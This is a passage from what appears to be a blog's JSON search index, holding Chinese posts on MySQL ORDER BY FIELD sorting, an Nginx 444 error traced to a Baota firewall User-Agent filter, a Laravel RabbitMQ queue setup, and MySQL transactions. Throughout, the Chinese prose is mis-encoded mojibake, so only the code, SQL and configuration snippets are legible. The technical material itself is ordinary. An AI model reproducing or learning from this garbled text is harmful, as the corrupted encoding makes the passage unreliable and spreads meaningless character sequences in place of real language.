å­˜åœ¨å¤šä¸ªæ’åºé”®æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨å·¦ä¾§çš„é”®ï¼Œå¦‚æœè¯¥åˆ—å­˜åœ¨ç›¸åŒå€¼çš„è¯ï¼Œåˆ™æŒ‰å³ä¾§çš„é”®è¿›è¡Œæ’åˆ— å¦‚æœæ’åºé”®çš„å€¼åŒ…å«NULLï¼Œåˆ™ä¼šåœ¨å¼€å¤´æˆ–è€…ç»“å°¾è¿›è¡Œæ±‡æ€»ï¼ˆæŒ‰æœ€å°å€¼å¯¹å¾…ï¼‰","text":"åœ¨Mysql ä¸­ï¼Œæƒ³è¦å¯¹ç»“æœè¿›è¡Œæ’åºï¼Œé€šå¸¸ä¼šä½¿ç”¨Order By å­å¥ï¼Œä½¿ç”¨æ—¶ï¼Œåº”æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åœ¨Order By å­å¥ä¸­ï¼Œä½¿ç”¨ ASC æˆ– DESC å…³é”®å­—æ¥è®¾ç½®æŸ¥è¯¢ç»“æœæ˜¯æŒ‰å‡åºæˆ–é™åºæ’åˆ—; é»˜è®¤æŒ‰å‡åºï¼ˆASCï¼‰æ’åˆ— Order By å­å¥å¯ä»¥æŒ‡å®šå¤šä¸ªæ’åºé”® å­˜åœ¨å¤šä¸ªæ’åºé”®æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨å·¦ä¾§çš„é”®ï¼Œå¦‚æœè¯¥åˆ—å­˜åœ¨ç›¸åŒå€¼çš„è¯ï¼Œåˆ™æŒ‰å³ä¾§çš„é”®è¿›è¡Œæ’åˆ— å¦‚æœæ’åºé”®çš„å€¼åŒ…å«NULLï¼Œåˆ™ä¼šåœ¨å¼€å¤´æˆ–è€…ç»“å°¾è¿›è¡Œæ±‡æ€»ï¼ˆæŒ‰æœ€å°å€¼å¯¹å¾…ï¼‰ å­˜åœ¨å¤šä¸ªæ’åºé”®æ—¶éœ€è¦æ³¨æ„ï¼Œç¬¬ä¸€åˆ—å¿…é¡»æœ‰ç›¸åŒçš„å€¼ï¼Œæ‰ä¼šå¯¹ç¬¬äºŒä¸ªåˆ—è¿›è¡Œæ’åº; å¦‚æœç¬¬ä¸€ä¸ªåˆ—çš„æ‰€æœ‰å€¼éƒ½æ˜¯å”¯ä¸€çš„ï¼Œé‚£ä¹ˆMysql å°†ä¸å†å¯¹ç¬¬äºŒä¸ªåˆ—è¿›è¡Œæ’åºã€‚ è¿™ç¯‡ç¬”è®°çš„é‡ç‚¹æ˜¯è®°å½•å¦‚ä½•åœ¨Mysqlä¸­ ä½¿ç”¨è‡ªå®šä¹‰æ’åºã€‚ ä¸ºä»€ä¹ˆä¼šæœ‰è¿™æ ·çš„éœ€æ±‚å‘¢ï¼Ÿ åœ¨å›ç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œå…ˆæ¥çœ‹è¿™æ ·ä¸€ä¸ªåœºæ™¯ã€‚ å‡è®¾ç°åœ¨æœ‰ä¸€å¼ å®¡æ ¸è®°å½•è¡¨ï¼š å­—æ®µåç§° å­—æ®µç±»å‹ å­—æ®µé»˜è®¤å€¼ æ˜¯å¦å…è®¸ä¸ºç©º ç´¢å¼• ç¤ºä¾‹å€¼ å­—æ®µæè¿° id Bigint(16) Unsigned è‡ªå¢ å¦ ä¸»é”® 1 ä¸»é”® ID uid Bigint(16) 0 å¦ æ™®é€šç´¢å¼• 1 ç”¨æˆ· ID status Tinyint(1) 0 å¦ - 0 å®¡æ ¸çŠ¶æ€ï¼ˆ1. ç­‰å¾…å®¡æ ¸ 2. å®¡æ ¸é€šè¿‡ 3. å®¡æ ¸æ‹’ç»ï¼‰ created_at Timestamp å¦ - 2021-06-03 21:54:53 åˆ›å»ºæ—¶é—´ updated_at Timestamp æ˜¯ - 2021-06-03 21:54:57 æ›´æ–°æ—¶é—´ åŸæœ¬æ˜¯æŒ‰ç…§è¿™æ ·çš„é¡ºåºè¿›è¡Œæ’åºçš„ï¼šå¾…å®¡æ ¸=&gt; å®¡æ ¸é€šè¿‡=&gt; å®¡æ ¸æ‹’ç» å¯¹åº”SQL åº”è¯¥æ˜¯ï¼š 12SELECT * FROM tableORDER BY status å‡å¦‚æœ‰ä¸€å¤©éœ€æ±‚å‘ç”Ÿäº†å˜åŒ–ï¼Œéœ€è¦ä¼˜å…ˆå°†å®¡æ ¸é€šè¿‡çš„æ’åœ¨å‰é¢ï¼Œå…¶æ¬¡æ˜¯ç­‰å¾…å®¡æ ¸ï¼Œæœ€åæ‰æ˜¯å®¡æ ¸æ‹’ç»ã€‚ æ­¤æ—¶ï¼Œä½ è‚¯å®šä¸æƒ³å°†å·²ç»å†™å¥½çš„ä»£ç å†â€œé‡æ„â€ä¸€æ¬¡ï¼Œæ‰‹åŠ¨å°†å¾…å®¡æ ¸ ä¸ å®¡æ ¸é€šè¿‡ çš„é¡ºåºè¿›è¡Œè°ƒæ¢ã€‚ä¸€æ¥æ˜¯ï¼Œå¯èƒ½ä¼šå°†ç°æœ‰å®Œæ•´çš„åŠŸèƒ½ï¼Œæ”¹å‡ºé—®é¢˜ï¼ŒäºŒæ¥æ˜¯ï¼Œå¦‚æœåé¢æ’åºéœ€æ±‚å†æ¬¡å‘ç”Ÿå˜åŒ–ï¼Œå°±å¾—å†æ¬¡é¢ä¸´ç›¸åŒçš„é—®é¢˜ã€‚ å¦‚æœMysql èƒ½è‡ªå®šä¹‰æ’åºï¼Œé‚£è¯¥å¤šå¥½å•Šã€‚ ä¸ç¦ä¼šè¿™æ ·å»æƒ³ã€‚ å¯ä»¥ä½¿ç”¨Mysql çš„å­—ç¬¦ä¸²å‡½æ•°â€”â€”FIELDï¼Œåœ¨ä¸æ”¹å˜ç°æœ‰é€»è¾‘çš„åŸºç¡€ä¸Šï¼Œä»…ä»…åªæ”¹å˜æ’åºé¡ºåºã€‚ å¯¹åº”SQL å¦‚ä¸‹ï¼š 12SELECT * FROM tableORDER BY FIELD(status, 2, 1, 3)","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"è®°ä¸€æ¬¡æœåŠ¡ç«¯é˜²ç«å¢™å¼•èµ·çš„ 444 é”™è¯¯","slug":"444-errors-caused-by-a-server-firewall","date":"2021-07-24T08:01:07.000Z","updated":"2021-07-24T08:02:42.348Z","comments":true,"path":"444-errors-caused-by-a-server-firewall/","link":"","permalink":"https://www.0x2beace.com/444-errors-caused-by-a-server-firewall/","excerpt":"è¿™å‘¨æ¥æ‰‹ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦åšä¸€ä¸ªHttpâ€œä»£ç†â€ï¼Œå°†è¯·æ±‚è½¬å‘è‡³ä¸åŒçš„åœºæ™¯ã€‚","text":"è¿™å‘¨æ¥æ‰‹ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦åšä¸€ä¸ªHttpâ€œä»£ç†â€ï¼Œå°†è¯·æ±‚è½¬å‘è‡³ä¸åŒçš„åœºæ™¯ã€‚ æœ¬æ¥ä¸æ˜¯å¤šå¤æ‚çš„éœ€æ±‚ï¼Œå®ç°èµ·æ¥ä¹Ÿæ²¡èŠ±å¤šä¹…ï¼Œåè€Œæ˜¯åœ¨éƒ¨ç½²æµ‹è¯•ä¸Šé¢ï¼Œè€—è´¹ä¸å°‘æ—¶é—´ã€‚ æœ¬åœ°æµ‹è¯•ä¸€åˆ‡æ­£å¸¸ä¹‹åï¼Œå˜å°†ä»£ç éƒ¨ç½²è‡³æœåŠ¡ç«¯ï¼Œå› ä¸ºæœåŠ¡å™¨ä½¿ç”¨å®å¡”ï¼Œéƒ¨ç½²è¿‡ç¨‹ä¹Ÿå¾ˆå¿«ã€‚ å¯æ˜¯é—®é¢˜å°±å‡ºåœ¨äº†ï¼Œæµ‹è¯•è¿‡ç¨‹ä¸­ã€‚ èµ·åˆæˆ‘åªæ˜¯å¯Ÿè§‰ï¼Œä»£ç†æœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œä¸€ç›´æ²¡æœ‰å°†è¯·æ±‚è½¬å‘å‡ºå»ï¼Œäºæ˜¯æŸ¥çœ‹è¯·æ±‚æ—¥å¿—ï¼Œå‘ç°æ»¡å±çš„http 444ã€‚ è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘åªæ˜¯æ¯”è¾ƒå›°æƒ‘ï¼Œæœ¬åœ°å‘é€ç›¸åŒçš„è¯·æ±‚éƒ½æ˜¯æ­£å¸¸çš„ï¼Œæ€ä¹ˆæ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚å°±æœ‰é—®é¢˜äº†ã€‚ äºæ˜¯ï¼ŒæŸ¥äº†ä¸€ä¸‹è¿™ä¸ª 444 çŠ¶æ€ç ã€‚ å®ƒå®é™…ä¸Šå¹¶ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ HTTP Status Codesï¼Œè€Œæ˜¯Nginx è‡ªå®šä¹‰çš„ä¸€ä¸ªCodeï¼Œé€šå¸¸ç”¨äºæœåŠ¡ç«¯æ²¡æœ‰è¿”å›ä¿¡æ¯ç»™å®¢æˆ·ç«¯å¹¶ä¸”å…³é—­äº†è¿æ¥çš„åœºæ™¯ã€‚ æœåŠ¡ç«¯çš„Nginx ä¸ºä»€ä¹ˆä¼šå…³é—­è¿æ¥ï¼Ÿé€šå¸¸ç”±ä»¥ä¸‹ä¸¤ç±»åŸå› å¼•èµ·ï¼š å®¢æˆ·ç«¯å‘é€æ¶æ„çš„è¯·æ±‚ å®¢æˆ·ç«¯å‘é€æ ¼å¼é”™è¯¯çš„è¯·æ±‚ æƒ³æ¸…æ¥šè¿™ä¸¤ç‚¹ä¹‹åï¼Œæˆ‘å¯¹æ¯”äº†ä¸€ä¸‹æœ¬åœ°å‘é€çš„è¯·æ±‚ï¼Œä¸å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ä¹‹é—´çš„å·®å¼‚ï¼š æœ¬åœ°ï¼š 1234curl --location --request POST 'http://xxx.xxx.com/route' \\--header 'User-Agent: PostmanRuntime/7.28.2' \\--form 'params=xxxx' \\--form 'params=xxxx' å®¢æˆ·ç«¯ï¼š 1234curl --location --request POST 'http://xxx.xxx.com/route' \\--header 'User-Agent: Apache-HttpClient/4.4.1' \\--form 'params=xxxx' \\--form 'params=xxxx' é™¤äº†User-Agent ä¸åŒï¼Œå…¶ä½™ä¿¡æ¯å‡ä¸€è‡´ã€‚ ä¸ºäº†éªŒè¯æˆ‘çš„çŒœæƒ³ï¼Œæ‰“å¼€å®å¡”çš„Nginx é˜²ç«å¢™ç«™ç‚¹æ—¥å¿—ï¼Œæœç„¶ï¼Œå…¨éƒ¨è¢«æ‹¦æˆªäº†ï¼š è‡³äºä¸ºä»€ä¹ˆUA ä¸­æºå¸¦äº†Apache-HttpClient/4.4.1 è¿™å‡ ä¸ªå…³é”®å­—å°±è¢«æ‹¦æˆªäº†ï¼Œå¯ä»¥é€šè¿‡å®å¡”é»˜è®¤çš„User-Agentè¿‡æ»¤ è§„åˆ™ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼š å¯ä»¥å¾ˆæ¸…æ™°åœ°çœ‹åˆ°ï¼Œå…³é”®è¯è¿‡æ»¤è§„åˆ™ä¸­ï¼Œæœ‰ä¸€ä¸ªApache-HttpClientã€‚ çŸ¥é“åŸå› ä¹‹åå°±å¥½åŠäº†ï¼Œå°†å…³é”®è¯è¿‡æ»¤çš„å¼€å…³ç»™å…³äº†ï¼ŒæœåŠ¡å³å¯æ­£å¸¸è®¿é—®ã€‚","categories":[{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/categories/%E9%98%B2%E7%81%AB%E5%A2%99/"}],"tags":[{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"å¦‚ä½•åœ¨ Laravel ä¸­ä½¿ç”¨ RabbitMQ","slug":"how-to-use-rabbitmq-in-laravel","date":"2021-07-19T14:42:10.000Z","updated":"2021-07-19T14:43:26.201Z","comments":true,"path":"how-to-use-rabbitmq-in-laravel/","link":"","permalink":"https://www.0x2beace.com/how-to-use-rabbitmq-in-laravel/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•å¦‚ä½•åœ¨Laravel ä¸­ä½¿ç”¨RabbitMQã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•å¦‚ä½•åœ¨Laravel ä¸­ä½¿ç”¨RabbitMQã€‚ Laravel è‡ªå¸¦äº†é‚£ä¹ˆå¤šé˜Ÿåˆ—ï¼Œä¸ºä»€ä¹ˆè¿˜è¦ä½¿ç”¨å…¶ä»–é˜Ÿåˆ—ï¼Ÿ è¿™æ˜¯å› ä¸ºLaravel çš„é˜Ÿåˆ—ï¼Œé€šå¸¸æ˜¯åŸºäºRedisã€Databaseçš„Driverï¼Œä½¿ç”¨èµ·æ¥æœ‰ä¸€å®šçš„å±€é™æ€§ã€‚ ä½¿ç”¨ä¸“ä¸šçš„é˜Ÿåˆ—ï¼Œæœ‰å¦‚ä¸‹ä¼˜ç‚¹ï¼š æ€§èƒ½æ›´å¥½ æä¾›å¯é æ€§æ¶ˆæ¯æŠ•é€’æ¨¡å¼ã€è¿”å›æ¨¡å¼ ä¿è¯æ•°æ®ä¸ä¸¢å¤±çš„å‰æä¸‹åšåˆ°é«˜å¯é æ€§ã€å¯ç”¨æ€§ å¦‚æœè¿˜ä¸çŸ¥é“Rabbit MQ æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘çš„å¦ä¸€ç¯‡ç¬”è®°â€”â€”RabbitMQ å¿«é€Ÿä¸Šæ‰‹ å®‰è£…Laravel å¹¶æ²¡æœ‰é»˜è®¤ä¸ºæˆ‘ä»¬æä¾› RabbitsMQ Driverï¼Œæ‰€å¹¸ä¸€äº›å‹¤åŠ³çš„äººï¼Œå¸®æˆ‘ä»¬å®Œæˆäº†ä¸€äº›è‰°è‹¦çš„å·¥ä½œâ€”â€”RabbitMQ Queue driver for Laravelã€‚ å¼•å…¥ä¾èµ–ï¼š 1composer require vladimir-yuldashev/laravel-queue-rabbitmq ç¼–è¾‘config/queue.phpï¼ŒåŠ å…¥ä¸€ä¸ªæ–°çš„è¿æ¥ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041'connections' =&gt; [ // ... 'rabbitmq' =&gt; [ 'driver' =&gt; 'rabbitmq', 'queue' =&gt; env('RABBITMQ_QUEUE', 'default'), 'connection' =&gt; PhpAmqpLib\\Connection\\AMQPLazyConnection::class, 'hosts' =&gt; [ [ 'host' =&gt; env('RABBITMQ_HOST', '127.0.0.1'), 'port' =&gt; env('RABBITMQ_PORT', 5672), 'user' =&gt; env('RABBITMQ_USER', 'guest'), 'password' =&gt; env('RABBITMQ_PASSWORD', 'guest'), 'vhost' =&gt; env('RABBITMQ_VHOST', '/'), ], ], 'options' =&gt; [ 'ssl_options' =&gt; [ 'cafile' =&gt; env('RABBITMQ_SSL_CAFILE', null), 'local_cert' =&gt; env('RABBITMQ_SSL_LOCALCERT', null), 'local_key' =&gt; env('RABBITMQ_SSL_LOCALKEY', null), 'verify_peer' =&gt; env('RABBITMQ_SSL_VERIFY_PEER', true), 'passphrase' =&gt; env('RABBITMQ_SSL_PASSPHRASE', null), ], 'queue' =&gt; [ 'job' =&gt; VladimirYuldashev\\LaravelQueueRabbitMQ\\Queue\\Jobs\\RabbitMQJob::class, ], ], /* * Set to \"horizon\" if you wish to use Laravel Horizon. */ 'worker' =&gt; env('RABBITMQ_WORKER', 'default'), ], // ... ], æœ€åç¼–è¾‘.envï¼Œå°†QUEUE_CONNECTION æ”¹æˆ rabbitmqï¼ŒåŒæ—¶åŠ å…¥ä»¥ä¸‹å†…å®¹ï¼š 1234RABBITMQ_HOST=127.0.0.1RABBITMQ_PORT=5672RABBITMQ_USER=guestRABBITMQ_PASSWORD=guest è‡³æ­¤ï¼ŒåŸºæœ¬çš„é…ç½®å·¥ä½œå°±å®Œæˆäº†ï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹æ›´å¤šé…ç½®é€‰é¡¹ï¼Œå¯ä»¥æŸ¥çœ‹æ–‡æ¡£ã€‚ RabbitMQ Queue çš„ä½¿ç”¨æ˜¯éµå®ˆLaravel é˜Ÿåˆ—APIçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªéœ€è¦å°†Driver è®¾ç½®ä¸º rabbitmqï¼Œæˆ‘ä»¬æ ¹æœ¬æ— éœ€å…³å¿ƒåº•å±‚çš„è¿æ¥æ˜¯å¦‚ä½•å®ç°çš„ï¼Œå°±åƒæ­£å¸¸ä½¿ç”¨Laravel é˜Ÿåˆ—é‚£æ ·å°±å¥½ã€‚ å¦‚æœä½ ä¸çŸ¥é“å¦‚ä½•ä½¿ç”¨Laravel é˜Ÿåˆ—APIï¼Œè¯·æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ã€‚ åŸºæœ¬ä½¿ç”¨é¦–å…ˆåˆ›å»ºä¸€ä¸ªJobï¼Œæ¥æ„Ÿå—ä¸€ä¸‹RabbitMQï¼š 1php artisan make:job RabbitMQJob å…¥é˜Ÿï¼š 12345Route::get(\"rabbitmq\", function () &#123; dispatch(new \\App\\Jobs\\RabbitMQJob())-&gt;onQueue(\"rabbitmq-job\"); return \"ok\";&#125;); è¯·æ±‚ä¸€ä¸‹ 127.0.0.1:8000/rabbitmqï¼Œç”Ÿäº§/æŠ•é€’ä¸€ä¸ªä»»åŠ¡/æ¶ˆæ¯åˆ°rabbitmq-job é˜Ÿåˆ—ä¸­ã€‚ ç„¶åæ‰“å¼€RabbitMQ ç®¡æ§å°â€”â€”http://localhost:15672ï¼Œå¯ä»¥çœ‹åˆ°å¤šå‡ºäº†ä¸€ä¸ªåä¸ºrabbitmq-job çš„é˜Ÿåˆ—ï¼š å¯ä»¥çœ‹åˆ°Ready çš„æ•°é‡æ˜¯ 1ï¼Œè¡¨ç¤ºè¯¥é˜Ÿåˆ—ä¸­ç­‰å¾…æ¶ˆè´¹çš„æ¶ˆæ¯æ•°é‡æ˜¯ 1ï¼Œå¦‚æœå†æ¬¡è¯·æ±‚æ¥å£ï¼Œå°±ä¼šå‘ç°Ready çš„æ•°é‡å˜æˆäº† 2ã€‚ æ­¤æ—¶å¦‚æœæ²¡æœ‰æ¶ˆè´¹è€…å»ä¸»åŠ¨æ¶ˆè´¹ï¼Œé‚£ä¹ˆæ¶ˆæ¯åˆ™ä¸€ç›´å­˜åœ¨äºé˜Ÿåˆ—ä¸­ã€‚ å°è¯•æŒ‡å®šé˜Ÿåˆ—å¼€å§‹æ¶ˆè´¹ï¼š 1php artisan queue:work --queue rabbitmq-job è¿™ä¸ªå°±æ˜¯æ¶ˆè´¹è€…è¿›è¡Œæ¶ˆè´¹çš„è¿‡ç¨‹ã€‚ å†æ¬¡æŸ¥çœ‹ç®¡æ§å°ï¼Œå¯ä»¥å‘ç°Ready çš„æ•°é‡å˜æˆäº† 0ã€‚ è¿™ä¸ªå°±æ˜¯RabbitMQ åœ¨Laravel ä¸­çš„åŸºæœ¬ä½¿ç”¨ï¼Œè¿˜æ˜¯å¾ˆå®¹æ˜“ä¸Šæ‰‹çš„ã€‚ å»¶æ—¶é˜Ÿåˆ—é˜Ÿåˆ—çš„å¦ä¸€ä¸ªå¸¸è§çš„ä½¿ç”¨åœºæ™¯å°±æ˜¯â€”â€”å»¶æ—¶é˜Ÿåˆ—ã€‚ åœ¨ä½¿ç”¨Redis ä½œä¸ºDriver æ—¶ï¼Œå¯ä»¥å¾ˆè½»æ¾ä½¿ç”¨delay API å®ç°å»¶è¿Ÿä»»åŠ¡ã€‚ ä½†æ˜¯å¯¹äºRabbitMQè€Œè¨€ï¼Œå¦‚æœåªæ˜¯è°ƒç”¨delay APIï¼Œå°±ä¼šå‘ç°æ¶ˆæ¯ä¸ä¼šè¢«æ¶ˆè´¹ã€‚ äºæ˜¯å»æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯å“ªé‡Œçš„é…ç½®æ²¡æœ‰å¯ç”¨ã€‚ä½†é—æ†¾çš„å‘ç°ï¼Œæ–‡æ¡£ä¸­å¹¶æ²¡æœ‰è¯´æ˜å»¶æ—¶é˜Ÿåˆ—çš„ä½¿ç”¨æ–¹å¼ã€‚ æœ€åæŠ±ç€ä¸€ä¸ä¾¥å¹¸åœ¨è¿™ä¸ªIssues ä¸‹æ‰¾åˆ°äº†ç­”æ¡ˆã€‚ å¯ä»¥å‘ç°ï¼Œå†³å®šå› ç´ å°±æ˜¯ä¸‹é¢è¿™è¡Œä»£ç ï¼š 1Artisan::call('rabbitmq:queue-declare', ['name' =&gt; $this-&gt;queue]); è¿™è¡Œä»£ç çš„æ„æ€å°±æ˜¯ï¼Œè°ƒç”¨ä¸€ä¸ªArtisan å‘½ä»¤ï¼Œè€Œè¿™ä¸ªå‘½ä»¤åˆ™ä¼šç”Ÿæˆä¸€ä¸ªé˜Ÿåˆ—ã€‚ è¿™ä¸ªå‘½ä»¤æ˜¯å“ªé‡Œæ¥çš„ï¼Ÿ è¿™æ˜¯RabbitMQ Queue æ‰©å±•åŒ…å°è£…çš„ã€‚ ç±»ä¼¼å‘½ä»¤è¿˜æœ‰ä»¥ä¸‹ï¼š 1234567rabbitmq:consume Consume messagesrabbitmq:exchange-declare Declare exchangerabbitmq:exchange-delete Delete exchangerabbitmq:queue-bind Bind queue to exchangerabbitmq:queue-declare Declare queuerabbitmq:queue-delete Delete queuerabbitmq:queue-purge Purge all messages in queue ç»“è¯­ä½¿ç”¨RabbitMQ ä½œä¸ºLaravel é˜Ÿåˆ—é©±åŠ¨ï¼Œä½¿å¾—Laravel é˜Ÿåˆ—çš„å¯æ‰©å±•æ€§æ›´é«˜äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"https://www.0x2beace.com/tags/RabbitMQ/"}]},{"title":"æµ…è°ˆ Mysql äº‹åŠ¡ä¸é”","slug":"talking-about-mysql-transaction-and-lock","date":"2021-07-18T03:12:26.000Z","updated":"2021-07-18T07:45:41.491Z","comments":true,"path":"talking-about-mysql-transaction-and-lock/","link":"","permalink":"https://www.0x2beace.com/talking-about-mysql-transaction-and-lock/","excerpt":"äº‹åŠ¡æ˜¯Mysql InnoDB å¼•æ“çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹ï¼Œå…·æœ‰ACID å››ä¸ªç‰¹æ€§ã€‚","text":"äº‹åŠ¡æ˜¯Mysql InnoDB å¼•æ“çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹ï¼Œå…·æœ‰ACID å››ä¸ªç‰¹æ€§ã€‚ åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼šäº‹åŠ¡çš„æ‰€æœ‰æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå…¨éƒ¨ä¸å®Œæˆï¼Œä¸ä¼šç»“æŸåœ¨æŸä¸ªä¸­é—´ç¯èŠ‚ã€‚ ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šäº‹åŠ¡å¼€å§‹ä¹‹å‰å’Œäº‹åŠ¡ç»“æŸä¹‹åï¼Œæ•°æ®åº“çš„å®Œæ•´æ€§é™åˆ¶æœªè¢«ç ´åã€‚ éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼šä¸¤ä¸ªæˆ–è€…å¤šä¸ªäº‹åŠ¡çš„æ‰§è¡Œæ˜¯äº’ä¸å¹²æ‰°çš„ï¼Œä¸€ä¸ªäº‹åŠ¡ä¸å¯èƒ½çœ‹åˆ°å…¶ä»–äº‹åŠ¡è¿è¡Œæ—¶ï¼Œä¸­é—´æŸä¸€æ—¶åˆ»çš„æ•°æ®ã€‚ æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼šäº‹åŠ¡å®Œæˆä¹‹åï¼Œäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹è¿›è¡ŒæŒä¹…åŒ–ä¿å­˜ï¼Œä¸ä¼šä¸¢å¤±ã€‚ å¹³æ—¶é¡¹ç›®å’Œå·¥ä½œä¸­ï¼Œä¼šå¾ˆé¢‘ç¹ä½¿ç”¨åˆ°äº‹åŠ¡ï¼Œä½†æ˜¯ï¼Œä¸€äº›ç»†èŠ‚å¦‚æœä¸ç¨åŠ æ³¨æ„ï¼Œæ˜¯å¾ˆå®¹æ˜“å‡ºç°é—®é¢˜çš„ã€‚ è§‚å¯Ÿäº‹åŠ¡ç¤ºä¾‹ä¸€è¿™æ˜¯ä¸€æ®µå¾ˆå¸¸è§çš„ä»£ç ï¼Œé€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼Œé¦–å…ˆå¼€å¯äº‹åŠ¡ï¼Œå¦‚æœtry ä»£ç å—æ²¡æœ‰å¼‚å¸¸ï¼Œæäº¤äº‹åŠ¡; å¦‚æœtry ä»£ç å—é‡åˆ°å¼‚å¸¸ï¼Œäº‹åŠ¡è¿›è¡Œå›æ»šã€‚ 123456789101112131415Route::get(\"test\", function () &#123; DB::beginTransaction(); try &#123; \\App\\Models\\User\\UserModel::whereUid(7) -&gt;update([ \"balance\" =&gt; \"1000\", ]); DB::commit(); &#125; catch (\\Exception $exception) &#123; DB::rollBack(); throw new Exception(\"æ“ä½œå¤±è´¥\"); &#125; return \"success\";&#125;); åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åªçŸ¥é“ï¼Œæ‰‹åŠ¨é€‰æ‹©äº†å¼€å¯ã€æäº¤æˆ–è€…å›æ»šäº‹åŠ¡ï¼Œä½†æ˜¯å¯¹äºäº‹åŠ¡æ‰§è¡Œçš„æ•´ä¸ªè¿‡ç¨‹ï¼Œæ¯”å¦‚ï¼šä»€ä¹ˆæ—¶å€™å¼€å¯äº†äº‹åŠ¡ã€ä»€ä¹ˆæ—¶å€™æäº¤çš„äº‹åŠ¡ã€æˆ‘ä»¬éƒ½æ˜¯æ¯«æ— æ„ŸçŸ¥çš„ã€‚ é‚£æœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•ï¼Œå¯ä»¥çœ‹åˆ°æ•´ä¸ªè¿‡ç¨‹å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯æœ‰çš„ã€‚ ç¤ºä¾‹äºŒåœ¨æ–°çš„ä»£ç ç¤ºä¾‹ä¸­ï¼ŒåªåŠ äº†ä¸€è¡Œä»£ç ï¼Œå®ƒçš„ä½œç”¨æ˜¯å»¶ç¼“äº‹åŠ¡æäº¤ï¼ˆè¿™é‡Œ sleep 15ç§’ï¼Œä¾¿äºè§‚å¯Ÿï¼‰ã€‚ 12345678910111213141516Route::get(\"sleep15\", function () &#123; DB::beginTransaction(); try &#123; \\App\\Models\\User\\UserAccountModel::whereUid(7) -&gt;update([ \"balance\" =&gt; \"2000\", ]); sleep(15); DB::commit(); &#125; catch (Exception $exception) &#123; DB::rollBack(); throw new Exception(\"æ“ä½œå¤±è´¥\"); &#125; return \"success\";&#125;); åŒæ—¶éœ€è¦é…åˆMysql å®¢æˆ·ç«¯ï¼Œæ‰§è¡Œä¸€ä¸ªSQL è¯­å¥ï¼ŒæŸ¥çœ‹æ­£åœ¨è¿›è¡Œä¸­çš„äº‹åŠ¡ï¼š 1SELECT * FROM information_schema.INNODB_TRX; å¯ä»¥åœ¨å‘é€è¯·æ±‚ä¹‹å‰å…ˆæ‰§è¡Œä¸€æ¬¡ï¼š å‘é€è¯·æ±‚ä¹‹åæ‰§è¡Œä¸€æ¬¡ï¼š è¯·æ±‚ç»“æŸä¹‹åå†æ‰§è¡Œä¸€æ¬¡ï¼š å¯ä»¥å¾ˆæ¸…æ™°åœ°çœ‹åˆ°ï¼Œäº‹åŠ¡ä»æ— åˆ°æœ‰å†åˆ°æ— çš„æ•´ä¸ªè¿‡ç¨‹ï¼š å‘é€è¯·æ±‚ä¹‹å‰ï¼Œæ­¤æ—¶äº‹åŠ¡è¿˜æ²¡æœ‰å¼€å¯ã€‚ å‘é€è¯·æ±‚ä¹‹åï¼Œæ­¤æ—¶äº‹åŠ¡å·²å¼€å¯ï¼Œä½†å› ä¸ºsleep çš„åŸå› ï¼Œæ²¡æ³•ç›´æ¥æäº¤æˆ–è€…å›æ»šï¼Œåªèƒ½ä¸€ç›´å¼€å¯äº‹åŠ¡ç­‰å¾…ã€‚ sleep ç»“æŸï¼Œæ­¤æ—¶äº‹åŠ¡è¿›è¡Œæäº¤æˆ–å›æ»šï¼Œè¯·æ±‚ç»“æŸã€‚ å¾€å¾€å› ä¸ºäº‹åŠ¡ä½¿ç”¨ä¸å½“ï¼Œè€Œé€ æˆé”è¡¨ç­‰é—®é¢˜ï¼ŒåŸå› å¤§å¤šå‡ºåœ¨äº†ç¬¬äºŒæ­¥ä¸Šã€‚ è§‚å¯Ÿé”Mysql 